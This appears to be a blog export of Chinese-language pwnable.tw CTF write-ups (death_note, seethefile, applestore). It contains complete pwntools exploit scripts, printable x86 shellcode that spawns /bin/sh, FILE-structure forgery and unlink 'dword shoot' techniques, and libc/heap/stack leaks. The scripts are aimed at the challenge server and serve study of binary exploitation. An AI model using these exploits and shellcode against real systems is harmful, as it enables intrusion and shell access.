dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 可以先看一下，执行shellcode时的寄存器状况： 根据如上的寄存器情况，shellcode可以写成这样： 12345678910111213141516171819202122232425262728293031323334shellcode = ''' /* execve(path='/bin///sh', argv=0, envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx /*rewrite shellcode to get 'int 80'*/ push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl /*set zero to edx*/ push ecx pop edx /*set 0x0b to eax*/ push edx pop eax xor al, 0x40 xor al, 0x4b /*foo order,for holding the place*/ push edx pop edx push edx pop edx'''shellcode = asm(shellcode) + '\x6b\x40' EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *debug = 1elf = ELF('./death_note')if debug: p = process('./death_note') context.log_level = 'debug' gdb.attach(p,'b *0x80487ef')else: p = remote('chall.pwnable.tw', 10201)def add(p,index,s): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index :') p.sendline(index) p.recvuntil('Name :') p.sendline(s)bss = 0x804a060puts_got = elf.got['puts']print hex(puts_got)offset = (puts_got - bss)/4#'''shellcode = shellcraft.sh()print len(asm(shellcode))print hex(asm(shellcode))'''shellcode = ''' /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl push ecx pop edx push edx pop eax xor al, 0x40 xor al, 0x4b push edx pop edx push edx pop edx'''print hex(len(asm(shellcode)))shellcode = asm(shellcode) + '\x6b\x40'add(p,str(offset),shellcode)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 seethefile 解题思路]]></title>
    <url>%2F2017%2F09%2F20%2Fpwnable-tw-seethefile%2F</url>
    <content type="text"><![CDATA[一开始特别懵的一道题。 题目功能main函数中一共4个功能，openfile、readfile、writefile、closefile。 其中，在最后退出时有一个明显的溢出，是scanf(“%s”,&amp;name); name位于bss段上，name下面有一个fp用于存储文件指针，可以被覆盖。 再看其他函数： openfile.只有一个简单的输入并打开，保存文件指针在bss段上的fp变量中： readfile,从fp所指的文件中每次读取0x18F字节字节到magicbuf中，这个变量也在bss段上。 writefile无法读取含有flag、FLAG、}的字符串，是一个打印函数 漏洞利用由于无法覆盖栈上内容，仅能覆盖bss段上空间，因此想法是覆盖fp指针，通过伪造fp指针进一步利用，这种利用方法在如下文章中已经给出： http://www.evil0x.com/posts/13764.html 另外一个重要的点在于libc的泄露。 由于linux独特的文件形式存储，文件的内存信息存储与/proc/pid/maps中，这里pid使用self来代替，如下图： 因此libc可以通过该方式泄露。 伪造file指针的过程，可以通过上面的链接中大致了解，最终的步骤是构造file对象的内容，由于最终要执行fclose(fp)，这一函数，而fclose中用户可控的函数指针执行位置在fclose如下位置， 因此必须要使fclose执行到该位置，其决定性作用的是前2个字节，可以通过动态调试来获得，将fclose(fp)，转化为system（fp），而fp的前两个字节有太重要的作用，建议不要动。 可以用’||/bin/sh’的方法执行获得shell。 至于前两个字节的调试，需要通过动态调试fclose的方法一步一步来找。 捷径的方法是用链接中给到用stderr内容来最初构建。 另外，题目中的输入方法是可以输入\x00的，算是个福利吧。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *debug = 0elf = ELF('./seethefile')if debug: p = process('./seethefile') libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p)else: p = remote('chall.pwnable.tw', 10200) libc = ELF('./libc_32.so.6') #off = 0x001b0000p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('What do you want to see :')p.sendline('/proc/self/maps')p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Your choice :')p.sendline('3')cache = p.recvuntil('Your choice :')cache_part = cache.split('\n')libc_start_addr = 0for i in cache_part: if 'libc' in i: libc_start_addr = int(i[0:8],16) breakif libc_start_addr == 0: print '[-] didnot find libc addr. exit' exit(0)system_libc = libc.symbols['system']system_libc_addr = libc_start_addr + system_libclog.success('find system:'+hex(system_libc_addr))p.sendline('5')p.recvuntil('Leave your name :')#gdb.attach(p,'b *0x8048b04')start =0x8048a37 # elf.symbols['puts']#fake_file_start = 0x804b280+0x4fake_file_jmp = fake_file_start + 180padding = 'p4nda'padding = padding.ljust(0x20,'!') + p32(fake_file_start)bin_sh = '||/bin/sh'start = system_libc_addrexp_back_main = '\x86\xb4\xad\xfb'+bin_sh+'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x8d\x6b\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x64\x98\x6b\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x24\x84\x6b\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'exp_back_main = exp_back_main.ljust(180,'b') print len(exp_back_main)exp_back_main+= p32(start)*15 + p32(start)*8p.sendline(padding + exp_back_main)p.recvuntil('see you next time')p.sendline('cd /home/seethefile/')p.sendline('./get_flag')p.recvuntil('magic :')p.sendline('Give me the flag\0')p.interactive()#backup#exp_back_main = '\x86\xb4\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x8d\x6b\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x64\x98\x6b\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x24\x84\x6b\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'#'\x00\x00\x00\x00\x00\x00\x00\x00\x00'#dustbin#exp_back_main = '\x86\x21\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x21\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x60\xb2\x04\x08\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA'+p32(fake_file_jmp)#0804B260#exp_back_main = '\x86\x91\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\xba\x04\x08\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x60\xb2\x04\x08\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x60\xb2\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'#exp_back_main = p32(fake_file_start) * 0x11 + 'aa' + '\x04' + 'a' + p32(fake_file_jmp) * 0x13 + p32(fake_file_jmp) * 2]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 applestore 解题思路]]></title>
    <url>%2F2017%2F09%2F14%2Fpwnable-tw-applestore%2F</url>
    <content type="text"><![CDATA[做到这道题的时候正赶上iPhone 8上市，撒花~（虽然不知道为啥） 题目功能先进到main函数，比较简单。 myCart位于bss段上，是一个长度为0x10。 主要的处理函数是handler函数： 这是一个标准的菜单类题目。挨个函数看下去 list： 这个是各种手机的价格，什么都没有。 再看第二个函数： 这个函数是一个添加购物车的函数，具体采用my_read函数，得到用户输入的商品号，然后用atoi函数进行判断。 my_read函数中存在一个问题，在read部分中以\0分割可以输入其他内容到栈上，并不影响运行结果，因为atoi函数是以\0为分割的。 再看create函数： 先malloc了一块空间，并返回，内容先不说。然后再看insert函数，首先在myCart上寻找，找到第3个字节为0的就将上面malloc的内存挂在上面。 当malloc、insert许多内存块后，大致就形成了链表。 delete函数 首先还是使用my_read函数，接受用户输入，根据输入判断删除的位置，进一步将被删除的内存块从链表中摘除，摘除的操作类似于smallbins的unlink操作。 cart函数，这是一个遍历链表并打印的过程，一遍来说，内存数据泄露都出现在这样的函数中。 checkout函数，这是一个结账函数，但是并不是真的结账，无论选择多少东西，函数都会告诉你下次结账吧。不过这里存在一个彩蛋，当选择商品的总价为7174时，会以1美元的价格在购物车里添加一台iPhone8. 漏洞分析位置就是在上面赠送的iPhone 8处，所谓的Free is the most expensive。 之前选择的商品都使用了malloc为商品创建了一块内存，但最后这个用了栈内的一块空间，距离ebp-2c个字节。 有了这点还不够，需要查看这块栈地址是否能被我们利用。 在其他函数中，距离ebp -0x20的位置都可以被用户自己修改。如， 以上位置，再加上my_read中的bug（上文提到的），就可以修改iPhone 8 内存块的任意结构了。 漏洞利用首先是7174价格的构造，简单的方法，所有的价格都以99结尾，然后价格以4结尾，总数应该是6台，所以尝试用19926 + 100 * 20 = 7174。即 6台 iPhone6 + 20台 iPhone 6s可以构造。 如此可以得到第27块是栈里的一块。 libc地址泄露在之前说过的，cart函数一般是地址泄露重要的突破点，这个也不例外，可以看到函数逻辑中，在打印部分是顺序遍历链表，若i+8不为空，就打印下一块的i，i+4部分： 前面构造的26块很正常，当第27块构造成如下结构时，即可泄露函数地址： 在用户输入时，别忘了buf是从-22开始的，即前面还有两个自己，这两个字节恰好填充为 “y\0” 如此便可泄露libc地址： 泄露堆地址仅仅泄露一个libc是不够的，还需要更多数据。 这个地址可以使用bss段上的myCart来泄露，因为bss端地址已知，其次myCart是链表头，具体可将内存块构造成如下这样： 同样，不要忘记前面的“y\0” 泄露stack地址上面可以得到第一块malloc得到堆的地址。一定有这样的疑惑，有了第一块堆的地址，通过计算26次malloc(0x10)就可以计算出第26块的地址，才利用上面的方法泄露，不就可以得出了第26块上 i+8的地址了吗？（栈上地址） 最开始就是这么写的，但是实际跑的时候发现并没有这样分配，没有特别多的规律，所以我采用了每次得到下一块堆块的地址，然后泄露其i+8内容，不断迭代得到最后的栈地址。 以上就得到了全部的地址。如果有人知道为啥堆分配不是顺次+ 0x18的请告诉我 仅仅泄露堆栈等地址貌似没什么用，必须找到可以篡改的地方。 Dword shoot DWORD SHOOT是堆漏洞的一个名词，意思是可以精确覆盖一个双字节地址的漏洞，常见的就是unlink漏洞。 上面说过，删除购物车里货物的方式类似于堆的unlink，因此存在的漏洞也类似于unlink的漏洞。 当我们修改第27块iPhone 8的后8字节时，对其进行删除就会有个DWORD SHOOT漏洞。 该漏洞如何利用呢？ 覆写一般的地址会有一个四字节的副作用产生，因此常见的利用方法是覆盖下两层函数的ebp，进一步控制esp，控制eip。 详细的原理可以参考之前我写的一篇关于pwnable.kr中的unlink题目： http://www.cnblogs.com/p4nda/p/7172104.html 利用思路是覆盖ebp，控制esp，控制eip，可参看这一篇：http://www.cnblogs.com/p4nda/p/7280520.html 第27块堆块的内容如下： 这次前面两位填写“27” 关键就在于如何构造stack_addr地址，必须找到一块我们可以覆写的内存，且在main函数结束之前不被破坏。这里我选择的在handler函数中的nptr块， 将其构造为： 由于会在main函数退出时执行system(‘/bin/sh’)，因此前两位填写“6\0”,使函数退出。 在这里还踩过一个坑在于使用子函数如cart内的nptr作为fake steak，但是不可以，有耐心的可以自行调一下为啥~ EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *debug = 0elf = ELF('./applestore')if debug: p = process('./applestore') libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' # gdb.attach(p)else: p = remote('chall.pwnable.tw', 10104) libc = ELF('./libc_32.so.6') #off = 0x001b0000for i in range(6): p.recvuntil("&gt;") p.sendline('2') p.recvuntil("Device Number&gt;") p.sendline('1')for i in range(20): p.recvuntil("&gt;") p.sendline('2') p.recvuntil("Device Number&gt;") p.sendline('2')p.recvuntil('&gt;')p.sendline('5')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline('y')if 'iPhone 8' in p.recvuntil('&gt;'): log.success('got iPhone 8')#leaklibcnum = 'y\0'read_got = elf.got['read']price = 0next_phone = 0last_phone = 0xdeadbeefleak = 'y'leak = flat(num,read_got,price,next_phone,last_phone)print len(leak),' : ', leakp.sendline('4')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline(leak)p.recvuntil('27: ')read_libc_addr = u32(p.recv(4))if read_libc_addr &gt; 0xf7000000: log.success('got read addr:'+hex(read_libc_addr))system_libc = libc.symbols['system']bin_sh_libc = next(libc.search('/bin/sh'))read_libc = libc.symbols['read']system_libc_addr = system_libc + read_libc_addr - read_libcbin_sh_libc_addr = bin_sh_libc + read_libc_addr - read_libc#leakheap#gdb.attach(p,'b *0x8048b03')p.recvuntil('&gt;')num = 'y\0'read_got = 0x804b070price = 0next_phone = 0last_phone = 0xdeadbeefleak = 'y'leak = flat(num,read_got,price,next_phone,last_phone)print len(leak),' : ', leakp.sendline('4')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline(leak)p.recvuntil('27: ')heap_addr = u32(p.recv(4))print '[+]heap: ',hex(heap_addr)#leak_stackstack_p = log.progress('pass')for i in range(26): p.recvuntil('&gt;') num = 'y\0' read_got = heap_addr+8 price = 0 next_phone = 0 last_phone = 0xdeadbeef leak = 'y' leak = flat(num,read_got,price,next_phone,last_phone) print len(leak),' : ', leak p.sendline('4') p.recvuntil('Let me check your cart. ok? (y/n) &gt;') p.sendline(leak) p.recvuntil('27: ') heap_addr = u32(p.recv(4)) print '[+]stack: ',hex(heap_addr) stack_p.status('stack' + hex(heap_addr))stack_addr = heap_addrp.success('find stack addr:'+hex(stack_addr))#dword shootebp_addr = stack_addr + 0x20 + 0x40num = '27'dword_shoot_exp = flat(num,0,0,stack_addr+64,ebp_addr-8)print len(dword_shoot_exp),":",dword_shoot_expp.recvuntil('&gt;')p.sendline('3')p.recvuntil('Number&gt;')#gdb.attach(p)p.sendline(dword_shoot_exp)'''#put system into stackp.recvuntil('&gt;')'''#exitnum = '6\0'esp = 0xdeadbeefexp = flat(num,esp,system_libc_addr,esp,bin_sh_libc_addr)p.recvuntil('&gt;')p.sendline(exp)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
</search>
